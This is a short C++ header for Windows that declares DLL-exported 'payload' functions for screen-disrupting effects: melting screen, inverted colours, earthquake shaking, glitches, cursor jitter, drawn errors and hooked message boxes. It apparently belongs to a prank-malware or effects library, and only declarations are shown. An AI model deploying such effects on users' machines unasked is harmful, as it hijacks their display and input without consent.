#pragma once

#include <Windows.h>

#define PAYLOAD extern "C" __declspec(dllexport) void __stdcall
#define ACTION PAYLOAD

LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
BOOL CALLBACK CleanWindowsProc(HWND hwnd, LPARAM lParam);

PAYLOAD payloadMessageBox(LPWSTR text, LPWSTR label, int style);
PAYLOAD payloadReverseText();
PAYLOAD payloadSound();
PAYLOAD payloadGlitch();
PAYLOAD payloadTunnel();
PAYLOAD payloadDrawErrors();
PAYLOAD payloadInvertScreen();
PAYLOAD payloadCursor(int power);
PAYLOAD payloadEarthquake(int delay, int power);
PAYLOAD payloadMeltingScreen(int size, int power);

ACTION clearWindows();